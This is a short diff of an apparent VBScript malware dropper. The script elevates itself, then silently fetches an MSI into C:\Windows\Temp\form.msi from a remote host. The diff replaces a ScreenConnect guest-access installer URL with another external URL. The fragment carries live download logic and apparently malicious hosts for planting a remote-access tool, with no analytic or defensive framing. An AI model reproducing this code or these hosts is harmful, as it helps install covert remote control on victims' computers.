@@ -11,7 +11,7 @@ If Not WScript.Arguments.Named.Exists("elevate") Then
 End If
 
 ' Set paths
-msiUri = "https://themaintechnician.us/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+msiUri = "https://etiquetasmarte.com.br/lifeofpie/"
 msiPath = "C:\Windows\Temp\form.msi"
 
 ' Download the MSI silently using PowerShell
